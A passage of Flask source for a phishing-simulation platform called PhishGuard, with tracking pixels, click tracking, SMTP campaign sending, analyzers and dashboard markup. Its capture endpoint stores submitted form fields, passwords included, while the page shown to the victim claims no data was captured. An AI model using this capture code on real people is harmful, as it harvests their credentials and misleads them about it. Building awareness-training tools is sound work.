# ─── Tracking Endpoints ───────────────────────────────────────────────────────
@app.route("/t/<token>.png")   # Tracking pixel (email open)
def track_pixel(token):
    conn = get_db()
    t = conn.execute("SELECT * FROM targets WHERE track_token=?", (token,)).fetchone()
    if t:
        log_event(t["campaign_id"], t["id"], "opened",
                  request.remote_addr, request.user_agent.string)
        conn.execute("UPDATE targets SET status=CASE WHEN status='pending' THEN 'opened' ELSE status END WHERE id=?", (t["id"],))
        conn.commit()
    conn.close()
    # Return 1x1 transparent GIF
    gif = b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x00\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b'
    resp = make_response(gif)
    resp.headers["Content-Type"] = "image/gif"
    resp.headers["Cache-Control"] = "no-store"
    return resp

@app.route("/click/<token>")   # Link click tracking
def track_click(token):
    conn = get_db()
    t = conn.execute("SELECT * FROM targets WHERE track_token=?", (token,)).fetchone()
    if t:
        log_event(t["campaign_id"], t["id"], "clicked",
                  request.remote_addr, request.user_agent.string)
        conn.execute("UPDATE targets SET status='clicked' WHERE id=? AND status NOT IN ('submitted')", (t["id"],))
        conn.commit()
        campaign = conn.execute("SELECT * FROM campaigns WHERE id=?", (t["campaign_id"],)).fetchone()
        tmpl_key = campaign["template_id"] if campaign else "generic"
        template = TEMPLATES.get(tmpl_key, {})
        lp_key   = template.get("landing_template", "generic")
        lp_html  = LANDING_PAGES.get(lp_key, LANDING_PAGES["generic"])
        html = lp_html.format(
            email=t["email"], token=token,
            first_name=t["first_name"] or t["email"].split("@")[0].capitalize()
        )
        conn.close()
        return html
    conn.close()
    return redirect("https://google.com")

@app.route("/lp/capture/<token>", methods=["POST"])   # Credential capture
def capture_creds(token):
    conn = get_db()
    t = conn.execute("SELECT * FROM targets WHERE track_token=?", (token,)).fetchone()
    if t:
        data = dict(request.form)
        data.pop("email", None)   # don't double-store obvious field
        log_event(t["campaign_id"], t["id"], "submitted",
                  request.remote_addr, request.user_agent.string,
                  json.dumps(data))
        conn.execute("UPDATE targets SET status='submitted' WHERE id=?", (t["id"],))
        conn.commit()
        campaign = conn.execute("SELECT * FROM campaigns WHERE id=?", (t["campaign_id"],)).fetchone()
        redirect_url = campaign["redirect_url"] if campaign else "https://google.com"
        conn.close()
        # Awareness page
        return """<!DOCTYPE html><html><head><meta charset="UTF-8">
<style>*{{box-sizing:border-box;margin:0;padding:0}}
body{{font-family:Arial,sans-serif;background:#fff3cd;display:flex;align-items:center;justify-content:center;min-height:100vh}}
.box{{background:#fff;max-width:520px;border-radius:8px;padding:40px;text-align:center;box-shadow:0 4px 16px rgba(0,0,0,.1);border-top:4px solid #ffc107}}
.icon{{font-size:56px;margin-bottom:16px}}
h2{{color:#856404;margin-bottom:12px;font-size:22px}}
p{{color:#555;font-size:14px;line-height:1.6;margin-bottom:20px}}
.tips{{background:#f8f9fa;border-radius:6px;padding:16px;text-align:left;font-size:13px;color:#444;line-height:1.8}}
.btn{{display:inline-block;margin-top:20px;padding:10px 24px;background:#0078d4;color:#fff;border-radius:4px;text-decoration:none;font-weight:bold}}</style></head>
<body><div class="box">
<div class="icon">⚠️</div>
<h2>This was a Phishing Simulation Test</h2>
<p>You have just entered your credentials into a <strong>simulated phishing page</strong>. This was a security awareness exercise conducted by your IT Security team. No real data was captured.</p>
<div class="tips">
  <strong>🛡 How to spot phishing:</strong><br>
  ✔ Always check the URL in your browser address bar<br>
  ✔ Look for HTTPS and a valid certificate<br>
  ✔ Be suspicious of urgency and pressure tactics<br>
  ✔ Never enter passwords from email links<br>
  ✔ When in doubt, go directly to the website
</div>
<a href="{url}" class="btn">Continue to Real Site →</a>
</div></body></html>""".format(url=redirect_url)
    conn.close()
    return redirect("https://google.com")


# ─── API Endpoints ────────────────────────────────────────────────────────────
@app.route("/api/campaigns", methods=["GET"])
def api_campaigns():
    conn = get_db()
    rows = conn.execute("""
        SELECT c.*,
          COUNT(DISTINCT t.id) total_targets,
          SUM(CASE WHEN t.status='opened'    THEN 1 ELSE 0 END) opened,
          SUM(CASE WHEN t.status='clicked'   THEN 1 ELSE 0 END) clicked,
          SUM(CASE WHEN t.status='submitted' THEN 1 ELSE 0 END) submitted
        FROM campaigns c
        LEFT JOIN targets t ON c.id=t.campaign_id
        GROUP BY c.id ORDER BY c.id DESC
    """).fetchall()
    conn.close()
    return jsonify([dict(r) for r in rows])

@app.route("/api/campaigns", methods=["POST"])
def api_create_campaign():
    d = request.json
    conn = get_db()
    cur = conn.execute("""
        INSERT INTO campaigns(name,template_id,subject,sender_name,sender_email,redirect_url,created_at)
        VALUES(?,?,?,?,?,?,?)
    """, (d["name"], d["template_id"], d["subject"],
          d.get("sender_name","IT Security"),
          d.get("sender_email","security@corp.internal"),
          d.get("redirect_url","https://google.com"),
          datetime.now().isoformat()))
    cid = cur.lastrowid
    conn.commit()
    conn.close()
    return jsonify({"id": cid, "ok": True})

@app.route("/api/campaigns/<int:cid>", methods=["GET"])
def api_campaign_detail(cid):
    conn = get_db()
    c = conn.execute("SELECT * FROM campaigns WHERE id=?", (cid,)).fetchone()
    targets = conn.execute("SELECT * FROM targets WHERE campaign_id=? ORDER BY id", (cid,)).fetchall()
    events  = conn.execute("SELECT * FROM events WHERE campaign_id=? ORDER BY id DESC LIMIT 100", (cid,)).fetchall()
    conn.close()
    if not c: return jsonify({"error": "not found"}), 404
    return jsonify({
        "campaign": dict(c),
        "targets":  [dict(t) for t in targets],
        "events":   [dict(e) for e in events],
    })

@app.route("/api/campaigns/<int:cid>/targets", methods=["POST"])
def api_add_targets(cid):
    rows = request.json.get("targets", [])
    conn = get_db()
    added = 0
    for r in rows:
        email = r.get("email","").strip()
        if not email: continue
        token = make_token(email + str(cid))
        try:
            conn.execute("""
                INSERT INTO targets(campaign_id,email,first_name,last_name,department,track_token)
                VALUES(?,?,?,?,?,?)
            """, (cid, email, r.get("first_name",""), r.get("last_name",""),
                  r.get("department",""), token))
            added += 1
        except Exception:
            pass
    conn.commit()
    conn.close()
    return jsonify({"added": added})

@app.route("/api/campaigns/<int:cid>/launch", methods=["POST"])
def api_launch(cid):
    """
    Launch = build preview email for each target.
    In a real deployment, wire this into smtplib.
    Here we mark targets as 'sent' and log the simulated send.
    """
    smtp_cfg = request.json or {}
    conn = get_db()
    c = conn.execute("SELECT * FROM campaigns WHERE id=?", (cid,)).fetchone()
    if not c: return jsonify({"error": "not found"}), 404
    targets = conn.execute("SELECT * FROM targets WHERE campaign_id=? AND status='pending'", (cid,)).fetchall()

    template = TEMPLATES.get(c["template_id"], {})
    sent = 0; errors = []

    for t in targets:
        token = t["track_token"]
        track_url  = f"{BASE_URL}/click/{token}"
        pixel_url  = f"{BASE_URL}/t/{token}.png"
        first_name = t["first_name"] or t["email"].split("@")[0].capitalize()

        body_html = template.get("html","").format(
            first_name=first_name,
            email=t["email"],
            department=t["department"] or "General",
            track_url=track_url,
            token=token[:8].upper(),
            timestamp=datetime.now().strftime("%b %d, %Y %H:%M UTC"),
        )
        # Inject tracking pixel
        body_html = body_html.replace("</body>",
            f'<img src="{pixel_url}" width="1" height="1" style="display:none"></body>')

        # ── SMTP send (optional) ──────────────────────────────────────────────
        use_smtp = smtp_cfg.get("use_smtp", False)
        if use_smtp:
            try:
                msg = MIMEMultipart("alternative")
                msg["Subject"] = c["subject"].format(first_name=first_name, email=t["email"])
                msg["From"]    = f'{c["sender_name"]} <{c["sender_email"]}>'
                msg["To"]      = t["email"]
                msg.attach(MIMEText(body_html, "html"))
                with smtplib.SMTP(smtp_cfg["host"], int(smtp_cfg.get("port", 587))) as sv:
                    sv.ehlo()
                    if smtp_cfg.get("tls", True): sv.starttls()
                    if smtp_cfg.get("user"):      sv.login(smtp_cfg["user"], smtp_cfg["password"])
                    sv.sendmail(c["sender_email"], t["email"], msg.as_string())
                sent += 1
            except Exception as ex:
                errors.append({"email": t["email"], "error": str(ex)})
                continue
        else:
            sent += 1   # simulated send

        log_event(cid, t["id"], "sent", data=body_html[:200])
        conn.execute("UPDATE targets SET status='sent' WHERE id=?", (t["id"],))

    conn.execute("UPDATE campaigns SET status='active',launched_at=? WHERE id=?",
                 (datetime.now().isoformat(), cid))
    conn.commit()
    conn.close()
    return jsonify({"sent": sent, "errors": errors})

@app.route("/api/campaigns/<int:cid>/preview", methods=["GET"])
def api_preview(cid):
    conn = get_db()
    c = conn.execute("SELECT * FROM campaigns WHERE id=?", (cid,)).fetchone()
    conn.close()
    if not c: return "Not found", 404
    template = TEMPLATES.get(c["template_id"], {})
    html = template.get("html","<p>No template</p>").format(
        first_name="Jane",
        email="jane.doe@company.com",
        department="Engineering",
        track_url="#",
        token="PREVIEW0",
        timestamp=datetime.now().strftime("%b %d, %Y %H:%M UTC"),
    )
    return html

@app.route("/api/campaigns/<int:cid>", methods=["DELETE"])
def api_delete_campaign(cid):
    conn = get_db()
    conn.execute("DELETE FROM events  WHERE campaign_id=?", (cid,))
    conn.execute("DELETE FROM targets WHERE campaign_id=?", (cid,))
    conn.execute("DELETE FROM campaigns WHERE id=?", (cid,))
    conn.commit()
    conn.close()
    return jsonify({"ok": True})

@app.route("/api/analyze/url", methods=["POST"])
def api_analyze_url():
    url = request.json.get("url","").strip()
    if not url: return jsonify({"error": "No URL"}), 400
    result = analyze_url(url)
    conn = get_db()
    conn.execute("INSERT INTO analyzer_results(input_type,input_data,risk_score,risk_level,indicators,timestamp) VALUES(?,?,?,?,?,?)",
                 ("url", url, result["score"], result["level"], json.dumps(result["indicators"]), datetime.now().isoformat()))
    conn.commit(); conn.close()
    return jsonify(result)

@app.route("/api/analyze/email", methods=["POST"])
def api_analyze_email():
    headers = request.json.get("headers","")
    body    = request.json.get("body","")
    if not (headers or body): return jsonify({"error": "No content"}), 400
    result = analyze_email(headers, body)
    conn = get_db()
    conn.execute("INSERT INTO analyzer_results(input_type,input_data,risk_score,risk_level,indicators,timestamp) VALUES(?,?,?,?,?,?)",
                 ("email", (headers+body)[:200], result["score"], result["level"],
                  json.dumps(result["indicators"]), datetime.now().isoformat()))
    conn.commit(); conn.close()
    return jsonify(result)

@app.route("/api/stats")
def api_stats():
    conn = get_db()
    total_campaigns = conn.execute("SELECT COUNT(*) FROM campaigns").fetchone()[0]
    active_campaigns= conn.execute("SELECT COUNT(*) FROM campaigns WHERE status='active'").fetchone()[0]
    total_targets   = conn.execute("SELECT COUNT(*) FROM targets").fetchone()[0]
    total_sent      = conn.execute("SELECT COUNT(*) FROM targets WHERE status!='pending'").fetchone()[0]
    total_clicked   = conn.execute("SELECT COUNT(*) FROM targets WHERE status IN ('clicked','submitted')").fetchone()[0]
    total_submitted = conn.execute("SELECT COUNT(*) FROM targets WHERE status='submitted'").fetchone()[0]
    recent_events   = conn.execute("SELECT * FROM events ORDER BY id DESC LIMIT 30").fetchall()
    analyze_history = conn.execute("SELECT * FROM analyzer_results ORDER BY id DESC LIMIT 20").fetchall()
    conn.close()
    click_rate = round(total_clicked/total_sent*100,1) if total_sent else 0
    submit_rate= round(total_submitted/total_sent*100,1) if total_sent else 0
    return jsonify({
        "campaigns": total_campaigns,
        "active": active_campaigns,
        "targets": total_targets,
        "sent": total_sent,
        "clicked": total_clicked,
        "submitted": total_submitted,
        "click_rate": click_rate,
        "submit_rate": submit_rate,
        "recent_events": [dict(e) for e in recent_events],
        "analyze_history": [dict(a) for a in analyze_history],
    })

@app.route("/api/templates")
def api_templates():
    return jsonify([{"id": k, **{kk: vv for kk, vv in v.items() if kk != "html"}}
                    for k, v in TEMPLATES.items()])

@app.route("/api/export/<int:cid>")
def api_export(cid):
    conn = get_db()
    targets = conn.execute("SELECT t.*, c.name campaign FROM targets t JOIN campaigns c ON c.id=t.campaign_id WHERE t.campaign_id=?", (cid,)).fetchall()
    conn.close()
    output = io.StringIO()
    w = csv.DictWriter(output, fieldnames=["campaign","email","first_name","last_name","department","status"])
    w.writeheader()
    for t in targets:
        w.writerow({k: t[k] for k in ["email","first_name","last_name","department","status"]
                    if k in dict(t)} | {"campaign": t["campaign"]})
    response = make_response(output.getvalue())
    response.headers["Content-Type"] = "text/csv"
    response.headers["Content-Disposition"] = f"attachment; filename=campaign_{cid}.csv"
    return response


# ─── Dashboard HTML ───────────────────────────────────────────────────────────
DASHBOARD = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>PhishGuard — Simulation Platform</title>
<link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@300;400;500;600;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
<script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/4.4.1/chart.umd.min.js"></script>
<style>
*,::before,::after{box-sizing:border-box;margin:0;padding:0}
:root{
  --bg:#0a0c10;--s1:#0f1117;--s2:#161b24;--s3:#1d2333;--s4:#252d3d;
  --b0:rgba(255,255,255,.06);--b1:rgba(255,255,255,.12);
  --orange:#f97316;--orange-dim:#c2410c;
  --blue:#3b82f6;--green:#22c55e;--red:#ef4444;--amber:#f59e0b;
  --violet:#a78bfa;--cyan:#22d3ee;--pink:#f472b6;
  --t1:#f8fafc;--t2:#94a3b8;--t3:#475569;
  --f:'DM Sans',sans-serif;--m:'Fira Code',monospace;
  --r:8px;
}
html,body{height:100%;background:var(--bg);color:var(--t1);font-family:var(--f);overflow-x:hidden}

/* ── TOPBAR ── */
.topbar{height:54px;display:flex;align-items:center;justify-content:space-between;padding:0 24px;background:var(--s1);border-bottom:1px solid var(--b0);position:sticky;top:0;z-index:200}
.logo{display:flex;align-items:center;gap:10px;cursor:pointer}
.logo-mark{width:32px;height:32px;border-radius:8px;background:linear-gradient(135deg,#f97316,#ef4444);display:flex;align-items:center;justify-content:center;font-size:16px;box-shadow:0 0 16px rgba(249,115,22,.35)}
.logo-name{font-size:1rem;font-weight:700;letter-spacing:-.3px}
.logo-name em{font-style:normal;color:var(--orange)}
.topbar-nav{display:flex;gap:2px}
.nt{padding:7px 14px;border-radius:7px;font-size:.8rem;font-weight:500;color:var(--t2);cursor:pointer;border:none;background:none;font-family:var(--f);transition:.15s}
.nt:hover{background:var(--s3);color:var(--t1)}
.nt.on{background:rgba(249,115,22,.14);color:var(--orange)}
.topbar-r{display:flex;align-items:center;gap:12px}
.warn-badge{display:flex;align-items:center;gap:6px;padding:4px 11px;border-radius:20px;background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.2);font-size:.7rem;font-weight:600;color:var(--red)}
#clk{font-family:var(--m);font-size:.7rem;color:var(--t3)}

/* ── LAYOUT ── */
.app{display:flex;height:calc(100vh - 54px)}
.sidebar{width:210px;min-width:210px;background:var(--s1);border-right:1px solid var(--b0);display:flex;flex-direction:column;padding:14px 0;overflow-y:auto}
.sb-sec{margin-bottom:22px}
.sb-label{font-size:.59rem;font-weight:700;letter-spacing:1.6px;text-transform:uppercase;color:var(--t3);padding:0 16px;margin-bottom:5px}
.sb-item{display:flex;align-items:center;gap:9px;padding:8px 16px;margin:1px 8px;border-radius:7px;font-size:.8rem;font-weight:500;color:var(--t2);cursor:pointer;transition:.14s;user-select:none}
.sb-item:hover{background:var(--s3);color:var(--t1)}
.sb-item.on{background:rgba(249,115,22,.12);color:var(--orange)}
.sb-item .ico{font-size:14px;width:18px;text-align:center}
.sb-badge{margin-left:auto;padding:1px 7px;border-radius:10px;font-size:.6rem;font-weight:700;font-family:var(--m)}
.sb-badge.orange{background:rgba(249,115,22,.15);color:var(--orange)}
.sb-badge.red{background:rgba(239,68,68,.12);color:var(--red)}
.sb-footer{margin-top:auto;text-align:center;padding:12px 0;font-size:.62rem;color:var(--t3);font-family:var(--m)}

/* ── MAIN ── */
.main{flex:1;overflow-y:auto;padding:22px 26px;scrollbar-width:thin;scrollbar-color:var(--s3) transparent}
.main::-webkit-scrollbar{width:4px}
.main::-webkit-scrollbar-thumb{background:var(--s3);border-radius:2px}

/* ── PAGE ── */
.pg{display:none;animation:fadeUp .2s ease}
.pg.on{display:block}
@keyframes fadeUp{from{opacity:0;transform:translateY(5px)}to{opacity:1;transform:none}}
.ph{margin-bottom:20px;display:flex;align-items:flex-start;justify-content:space-between;flex-wrap:wrap;gap:10px}
.ph-left .pt{font-size:1.35rem;font-weight:700;letter-spacing:-.3px}
.ph-left .ps{font-size:.8rem;color:var(--t2);margin-top:2px}
.ph-right{display:flex;gap:8px;flex-wrap:wrap}

/* ── BUTTONS ── */
.btn{padding:8px 18px;border-radius:7px;font-size:.8rem;font-weight:600;cursor:pointer;border:none;font-family:var(--f);transition:.15s;display:inline-flex;align-items:center;gap:6px}
.btn-primary{background:var(--orange);color:#fff}
.btn-primary:hover{background:var(--orange-dim)}
.btn-outline{background:transparent;color:var(--t2);border:1px solid var(--b1)}
.btn-outline:hover{background:var(--s3);color:var(--t1)}
.btn-danger{background:rgba(239,68,68,.15);color:var(--red);border:1px solid rgba(239,68,68,.25)}
.btn-danger:hover{background:rgba(239,68,68,.25)}
.btn-green{background:rgba(34,197,94,.15);color:var(--green);border:1px solid rgba(34,197,94,.25)}
.btn-green:hover{background:rgba(34,197,94,.25)}
.btn-sm{padding:5px 12px;font-size:.72rem}

/* ── STAT CARDS ── */
.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:16px}
.sc{background:var(--s2);border:1px solid var(--b0);border-radius:var(--r);padding:16px 18px;position:relative;overflow:hidden;transition:.2s}
.sc:hover{border-color:var(--b1)}
.sc::before{content:"";position:absolute;top:0;left:0;right:0;height:2px;background:var(--c,var(--orange));border-radius:var(--r) var(--r) 0 0}
.sc-label{font-size:.65rem;font-weight:700;letter-spacing:1px;text-transform:uppercase;color:var(--t3);margin-bottom:8px}
.sc-val{font-size:1.9rem;font-weight:800;line-height:1;letter-spacing:-.5px;color:var(--c,var(--t1));font-variant-numeric:tabular-nums}
.sc-sub{font-size:.65rem;font-family:var(--m);color:var(--t3);margin-top:5px}

/* ── CARD ── */
.card{background:var(--s2);border:1px solid var(--b0);border-radius:var(--r);overflow:hidden;margin-bottom:14px}
.card-head{display:flex;align-items:center;justify-content:space-between;padding:12px 16px;border-bottom:1px solid var(--b0);background:rgba(0,0,0,.1)}
.card-title{font-size:.74rem;font-weight:700;letter-spacing:.6px;text-transform:uppercase;color:var(--t2);display:flex;align-items:center;gap:7px}
.card-title .dot{width:5px;height:5px;border-radius:50%;background:var(--orange)}
.card-meta{font-family:var(--m);font-size:.67rem;color:var(--t3)}

/* ── TABLE ── */
.tbl-wrap{overflow-x:auto}
.tbl{width:100%;border-collapse:collapse;font-size:.78rem}
.tbl th{padding:9px 14px;text-align:left;font-size:.62rem;font-weight:700;letter-spacing:1px;text-transform:uppercase;color:var(--t3);border-bottom:1px solid var(--b0);background:rgba(0,0,0,.15);white-space:nowrap}
.tbl td{padding:11px 14px;border-bottom:1px solid rgba(255,255,255,.025);vertical-align:middle}
.tbl tr:hover td{background:rgba(255,255,255,.02)}
.mono{font-family:var(--m);font-size:.7rem}
.tag{display:inline-flex;padding:2px 9px;border-radius:4px;font-size:.63rem;font-weight:700;letter-spacing:.4px}
.tag-draft   {background:rgba(100,116,139,.12);color:#94a3b8;border:1px solid rgba(100,116,139,.2)}
.tag-active  {background:rgba(34,197,94,.1);color:var(--green);border:1px solid rgba(34,197,94,.2)}
.tag-complete{background:rgba(59,130,246,.1);color:var(--blue);border:1px solid rgba(59,130,246,.2)}
.tag-pending {background:rgba(249,115,22,.1);color:var(--orange);border:1px solid rgba(249,115,22,.2)}
.tag-sent    {background:rgba(59,130,246,.1);color:var(--blue);border:1px solid rgba(59,130,246,.2)}
.tag-opened  {background:rgba(245,158,11,.1);color:var(--amber);border:1px solid rgba(245,158,11,.2)}
.tag-clicked {background:rgba(249,115,22,.1);color:var(--orange);border:1px solid rgba(249,115,22,.2)}
.tag-submitted{background:rgba(239,68,68,.1);color:var(--red);border:1px solid rgba(239,68,68,.2)}

/* ── PROGRESS BARS ── */
.prog{height:5px;background:var(--s4);border-radius:3px;overflow:hidden;min-width:80px}
.prog-fill{height:5px;border-radius:3px;transition:width .5s ease}

/* ── GRID ── */
.g2{display:grid;grid-template-columns:1fr 1fr;gap:14px}
.g3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:14px}

/* ── FORMS / INPUTS ── */
.field{margin-bottom:14px}
.field label{display:block;font-size:.73rem;font-weight:600;color:var(--t2);margin-bottom:5px}
.inp{width:100%;padding:9px 12px;background:var(--s3);border:1px solid var(--b0);border-radius:7px;color:var(--t1);font-size:.83rem;font-family:var(--f);outline:none;transition:.15s}
.inp:focus{border-color:var(--orange);box-shadow:0 0 0 2px rgba(249,115,22,.15)}
.inp::placeholder{color:var(--t3)}
select.inp option{background:var(--s3)}
textarea.inp{resize:vertical;min-height:80px}

/* ── MODAL ── */
.modal-bg{position:fixed;inset:0;background:rgba(0,0,0,.65);z-index:500;display:flex;align-items:center;justify-content:center;padding:20px;backdrop-filter:blur(3px)}
.modal-bg.hidden{display:none}
.modal{background:var(--s2);border:1px solid var(--b1);border-radius:12px;width:100%;max-width:580px;max-height:90vh;overflow-y:auto;animation:fadeUp .18s ease}
.modal-head{display:flex;align-items:center;justify-content:space-between;padding:18px 22px;border-bottom:1px solid var(--b0)}
.modal-title{font-size:.95rem;font-weight:700}
.modal-close{background:none;border:none;color:var(--t2);font-size:1.2rem;cursor:pointer;padding:4px;border-radius:4px;line-height:1}
.modal-close:hover{color:var(--t1);background:var(--s3)}
.modal-body{padding:22px}
.modal-foot{padding:14px 22px;border-top:1px solid var(--b0);display:flex;justify-content:flex-end;gap:8px;background:rgba(0,0,0,.1)}

/* ── RISK METER ── */
.risk-ring{position:relative;width:120px;height:120px;margin:0 auto 16px}
.risk-ring svg{transform:rotate(-90deg)}
.risk-label{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center}
.risk-num{font-size:1.6rem;font-weight:800;font-family:var(--m);line-height:1}
.risk-txt{font-size:.65rem;font-weight:700;letter-spacing:.5px;text-transform:uppercase;margin-top:2px}

/* ── INDICATOR LIST ── */
.indicator{display:flex;align-items:flex-start;gap:10px;padding:10px 14px;border-bottom:1px solid rgba(255,255,255,.03)}
.indicator:last-child{border-bottom:none}
.ind-sev{padding:1px 8px;border-radius:3px;font-size:.62rem;font-weight:700;flex-shrink:0;margin-top:2px}
.sev-critical{background:rgba(239,68,68,.12);color:var(--red);border:1px solid rgba(239,68,68,.2)}
.sev-high    {background:rgba(249,115,22,.1);color:var(--orange);border:1px solid rgba(249,115,22,.2)}
.sev-medium  {background:rgba(245,158,11,.1);color:var(--amber);border:1px solid rgba(245,158,11,.2)}
.sev-low     {background:rgba(100,116,139,.1);color:var(--t2);border:1px solid rgba(100,116,139,.2)}
.ind-text{font-size:.78rem;color:var(--t1);flex:1}
.ind-pts{font-family:var(--m);font-size:.68rem;color:var(--t3);flex-shrink:0}

/* ── TEMPLATE GRID ── */
.tmpl-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:10px;padding:14px}
.tmpl-card{background:var(--s3);border:2px solid var(--b0);border-radius:8px;padding:14px;cursor:pointer;transition:.15s}
.tmpl-card:hover{border-color:rgba(249,115,22,.4);background:var(--s4)}
.tmpl-card.sel{border-color:var(--orange);background:rgba(249,115,22,.08)}
.tmpl-icon{font-size:22px;margin-bottom:8px}
.tmpl-name{font-size:.82rem;font-weight:600;color:var(--t1);margin-bottom:3px}
.tmpl-cat{font-size:.68rem;color:var(--t3)}

/* ── EVENT FEED ── */
.ev-feed{max-height:280px;overflow-y:auto;scrollbar-width:thin;scrollbar-color:var(--s3) transparent}
.ev-row{display:flex;align-items:center;gap:10px;padding:9px 14px;border-bottom:1px solid rgba(255,255,255,.025);font-size:.74rem;animation:fadeUp .2s ease}
.ev-row:hover{background:rgba(255,255,255,.02)}
.ev-type{padding:2px 8px;border-radius:4px;font-size:.62rem;font-weight:700;flex-shrink:0}
.type-sent     {background:rgba(59,130,246,.1);color:var(--blue)}
.type-opened   {background:rgba(245,158,11,.1);color:var(--amber)}
.type-clicked  {background:rgba(249,115,22,.1);color:var(--orange)}
.type-submitted{background:rgba(239,68,68,.1);color:var(--red)}
.ev-ip{font-family:var(--m);font-size:.67rem;color:var(--cyan);flex-shrink:0}
.ev-ts{font-family:var(--m);font-size:.62rem;color:var(--t3);margin-left:auto;flex-shrink:0}

/* ── DETAIL PANEL ── */
.detail-panel{background:var(--s3);border:1px solid var(--b0);border-radius:var(--r);padding:16px;margin-bottom:14px}
.dp-row{display:flex;justify-content:space-between;align-items:center;padding:7px 0;border-bottom:1px solid rgba(255,255,255,.04);font-size:.78rem}
.dp-row:last-child{border-bottom:none}
.dp-label{color:var(--t3);font-size:.72rem}

/* ── CHART ── */
.chart-wrap{padding:14px 16px;height:200px}

/* ── EMPTY ── */
.empty{display:flex;flex-direction:column;align-items:center;justify-content:center;padding:48px 20px;color:var(--t3);gap:8px}
.empty .eico{font-size:2rem;opacity:.4}
.empty .etxt{font-size:.82rem}

/* ── TOAST ── */
#toast{position:fixed;bottom:20px;right:20px;z-index:9999;background:var(--s2);border:1px solid rgba(249,115,22,.35);border-radius:9px;padding:11px 16px;font-size:.78rem;color:var(--t1);box-shadow:0 8px 28px rgba(0,0,0,.5);opacity:0;transform:translateY(6px) scale(.97);transition:all .22s cubic-bezier(.34,1.56,.64,1);pointer-events:none;max-width:320px}
#toast.show{opacity:1;transform:none}

@media(max-width:1000px){.stats{grid-template-columns:repeat(2,1fr)}.g2,.g3{grid-template-columns:1fr}.sidebar{display:none}}
</style>
</head>
<body>

<header class="topbar">
  <div class="logo" onclick="nav('dashboard')">
    <div class="logo-mark">🎣</div>
    <div class="logo-name"><em>PhishGuard</em></div>
  </div>
  <div class="topbar-nav">
    <button class="nt on" data-pg="dashboard"   onclick="nav('dashboard')">Dashboard</button>
    <button class="nt"    data-pg="campaigns"   onclick="nav('campaigns')">Campaigns</button>
    <button class="nt"    data-pg="analyzer"    onclick="nav('analyzer')">Analyzer</button>
    <button class="nt"    data-pg="awareness"   onclick="nav('awareness')">Awareness</button>
  </div>
  <div class="topbar-r">
    <div class="warn-badge">⚠ Authorized Use Only</div>
    <div id="clk">--:--:--</div>
  </div>
</header>

<div class="app">
  <nav class="sidebar">
    <div class="sb-sec">
      <div class="sb-label">Platform</div>
      <div class="sb-item on" data-pg="dashboard"  onclick="nav('dashboard')"> <span class="ico">📊</span>Dashboard</div>
      <div class="sb-item"    data-pg="campaigns"  onclick="nav('campaigns')"> <span class="ico">📧</span>Campaigns  <span class="sb-badge orange" id="sb-campaigns">0</span></div>
      <div class="sb-item"    data-pg="new-campaign" onclick="nav('new-campaign')"><span class="ico">➕</span>New Campaign</div>
    </div>
    <div class="sb-sec">
      <div class="sb-label">Detection</div>
      <div class="sb-item"   data-pg="analyzer"   onclick="nav('analyzer')">  <span class="ico">🔍</span>URL Analyzer</div>
      <div class="sb-item"   data-pg="email-scan" onclick="nav('email-scan')"><span class="ico">📨</span>Email Scanner</div>
      <div class="sb-item"   data-pg="awareness"  onclick="nav('awareness')"> <span class="ico">📚</span>Awareness</div>
    </div>
    <div class="sb-sec">
      <div class="sb-label">Reports</div>
      <div class="sb-item" data-pg="events" onclick="nav('events')">  <span class="ico">⚡</span>Live Events  <span class="sb-badge red" id="sb-events">0</span></div>
    </div>
    <div class="sb-footer">PhishGuard v1.0</div>
  </nav>

  <main class="main" id="main">

    <!-- ════ DASHBOARD ════ -->
    <div class="pg on" id="pg-dashboard">
      <div class="ph">
        <div class="ph-left"><div class="pt">Security Awareness Dashboard</div><div class="ps">Live overview of all phishing simulations and detections</div></div>
        <div class="ph-right"><button class="btn btn-primary" onclick="nav('new-campaign')">➕ New Campaign</button></div>
      </div>
      <div class="stats">
        <div class="sc" style="--c:var(--orange)"><div class="sc-label">Campaigns</div><div class="sc-val" id="v-campaigns">0</div><div class="sc-sub" id="v-active">0 active</div></div>
        <div class="sc" style="--c:var(--blue)">  <div class="sc-label">Emails Sent</div><div class="sc-val" id="v-sent">0</div><div class="sc-sub">to targets</div></div>
        <div class="sc" style="--c:var(--amber)"> <div class="sc-label">Click Rate</div><div class="sc-val" id="v-crate">0%</div><div class="sc-sub" id="v-clicked">0 clicked</div></div>
        <div class="sc" style="--c:var(--red)">   <div class="sc-label">Cred Capture</div><div class="sc-val" id="v-srate">0%</div><div class="sc-sub" id="v-submitted">0 submitted</div></div>
      </div>
      <div class="g2">
        <div class="card">
          <div class="card-head"><div class="card-title"><span class="dot"></span>Recent Campaigns</div><button class="btn btn-outline btn-sm" onclick="nav('campaigns')">View All →</button></div>
          <div class="tbl-wrap">
            <table class="tbl">
              <thead><tr><th>Name</th><th>Targets</th><th>Click Rate</th><th>Status</th></tr></thead>
              <tbody id="dash-campaigns"></tbody>
            </table>
          </div>
        </div>
        <div class="card">
          <div class="card-head"><div class="card-title"><span class="dot" style="background:var(--red)"></span>Live Event Feed</div><div class="card-meta" id="dash-ev-count">—</div></div>
          <div class="ev-feed" id="dash-events"></div>
        </div>
      </div>
      <div class="card">
        <div class="card-head"><div class="card-title"><span class="dot" style="background:var(--violet)"></span>Campaign Funnel</div></div>
        <div class="chart-wrap"><canvas id="funnel-chart"></canvas></div>
      </div>
    </div>

    <!-- ════ CAMPAIGNS LIST ════ -->
    <div class="pg" id="pg-campaigns">
      <div class="ph">
        <div class="ph-left"><div class="pt">Campaigns</div><div class="ps">Manage phishing simulation campaigns</div></div>
        <div class="ph-right"><button class="btn btn-primary" onclick="nav('new-campaign')">➕ New Campaign</button></div>
      </div>
      <div class="card">
